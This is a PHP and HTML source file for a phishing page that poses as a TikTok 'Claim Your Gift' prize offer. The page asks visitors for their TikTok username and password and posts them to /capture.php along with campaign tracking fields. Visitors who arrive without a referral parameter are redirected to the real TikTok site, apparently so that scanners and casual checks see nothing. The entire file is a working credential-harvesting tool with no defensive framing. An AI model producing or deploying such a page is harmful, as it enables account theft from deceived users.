<?php
$ref = $_GET['ref'] ?? '';
$camp = $_GET['camp'] ?? 'Campaign';
if (empty($ref)) { header("Location: https://www.tiktok.com"); exit; }
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Gift</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .box {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 16px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            border: 1px solid #2a2a2a;
        }
        .box .icon { font-size: 60px; display: block; margin-bottom: 10px; }
        .box h1 { color: #fff; font-size: 24px; }
        .box .sub { color: #888; font-size: 14px; margin: 8px 0 20px; }
        .box input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            background: #0a0a0a;
            border: 1px solid #2a2a2a;
            border-radius: 8px;
            color: #fff;
            font-size: 15px;
        }
        .box input:focus { outline: none; border-color: #25f4ee; }
        .box button {
            width: 100%;
            padding: 14px;
            margin-top: 15px;
            background: #25f4ee;
            border: none;
            border-radius: 8px;
            color: #000;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
        }
        .box button:hover { opacity: 0.9; }
        .box .footer-text { color: #555; font-size: 12px; margin-top: 15px; }
        .badge { color: #25f4ee; font-size: 12px; margin-bottom: 10px; display: block; }
    </style>
</head>
<body>
    <div class="box">
        <span class="icon">🎁</span>
        <h1>Claim Your Gift</h1>
        <span class="badge">🎉 You Won a Prize!</span>
        <p class="sub">Claim your TikTok gift now</p>
        <form method="POST" action="/capture.php">
            <input type="hidden" name="ref" value="<?php echo htmlspecialchars($ref); ?>">
            <input type="hidden" name="campaign" value="<?php echo htmlspecialchars($camp); ?>">
            <input type="text" name="username" placeholder="TikTok Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">🎁 Claim Gift</button>
        </form>
        <p class="footer-text">By continuing you agree to our terms</p>
    </div>
</body>
</html>
